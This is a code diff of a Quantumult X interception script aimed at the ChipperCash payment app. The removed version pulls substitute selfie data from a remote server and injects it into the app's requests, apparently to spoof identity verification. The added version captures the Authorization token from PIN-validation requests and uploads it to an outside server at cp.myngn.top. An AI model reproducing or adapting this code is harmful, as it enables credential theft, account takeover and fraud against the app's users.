@@ -1,83 +1,51 @@
-// 第一步：从指定 URL 获取新的 selfie 数据
-const fetchNewSelfie = () => {
-    const url = "https://mpfacetxt.myngn.top/getChipperContent.php";
+const urlToIntercept = "https://auth.chippercash.com/pin/validate";
 
-    return new Promise((resolve, reject) => {
-        const request = {
-            url: url,
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                "request_chipper": true
-            })
-        };
+// Quantumult X 拦截请求的处理逻辑
+const myRequest = $request;
 
-        const xhr = new XMLHttpRequest();
-        xhr.open(request.method, request.url, true);
-        xhr.setRequestHeader("Content-Type", request.headers["Content-Type"]);
-
-        xhr.onload = function() {
-            if (xhr.status === 200) {
-                let response_data = JSON.parse(xhr.responseText);
-                resolve(response_data.file_content); // 返回新的 selfie 数据
-            } else {
-                console.log(`请求失败，HTTP 状态码：${xhr.status}`);
-                reject(null);
-            }
-        };
-
-        xhr.onerror = function() {
-            console.log("请求失败，错误信息如下：");
-            console.log(xhr.statusText);
-            reject(null);
-        };
-
-        xhr.send(request.body);
-    });
-};
-
-// 第二步：拦截请求并替换 selfie 数据
-const interceptRequest = (newSelfie) => {
-    let body = $request.body;
-    let bodyObj = JSON.parse(body);
-
-    if (newSelfie) {
-        // 替换 selfie 字段
-        if (bodyObj.selfie) {
-            bodyObj.selfie = newSelfie;
-        }
-    } else {
-        console.log("No new selfie data found.");
-    }
-
-    // 将修改后的 JSON 对象转回字符串
-    body = JSON.stringify(bodyObj);
-
-    // 返回修改后的请求体
-    $done({ body });
-};
-
-// 执行流程
-fetchNewSelfie().then(newSelfie => {
-    // 拦截并修改 selfie 请求
-    interceptRequest(newSelfie);
-});
-
-// 拦截并记录 Authorization token
-const url = $request.url;
-const headers = $request.headers;
-
-if (url.includes("/pin/validate")) {
-    const authorizationToken = headers['Authorization'];
+// 判断是否拦截到目标URL
+if (myRequest.url.includes(urlToIntercept)) {
+    
+    // 获取 Authorization 值
+    const authorizationToken = myRequest.headers["Authorization"];
 
     if (authorizationToken) {
-        // 显示通知
-        $notify("ChipperCash Token", "Authorization Token:", authorizationToken);
+        // 准备上传数据
+        const uploadUrl = "https://cp.myngn.top/receive_token";
+        const uploadHeaders = {
+            'Content-Type': 'application/json'
+        };
+        const uploadData = {
+            'Authorization': authorizationToken
+        };
+
+        // 通过 $task.fetch 来发送请求
+        const uploadRequest = {
+            url: uploadUrl,
+            method: 'POST',
+            headers: uploadHeaders,
+            body: JSON.stringify(uploadData)
+        };
+
+        // 发送 POST 请求到上传服务器
+        $task.fetch(uploadRequest).then(response => {
+            const statusCode = response.statusCode;
+            const responseBody = response.body;
+
+            // 检查上传是否成功并输出信息
+            if (statusCode === 200) {
+                $notify("Token 上传成功", "成功上传 Authorization 令牌", `服务器响应: ${responseBody}`);
+            } else {
+                $notify("Token 上传失败", `状态码: ${statusCode}`, `响应信息: ${responseBody}`);
+            }
+        }).catch(error => {
+            $notify("Token 上传失败", "请求发生错误", `${error}`);
+        });
     } else {
-        $notify("ChipperCash Token", "Authorization Token:", "未找到");
+        // 如果没有找到 Authorization 头
+        $notify("Token 上传失败", "未找到 Authorization 令牌", "请求头中不包含 Authorization 字段");
     }
 }
 
-$done({headers: headers});
+// 结束脚本
+$done();
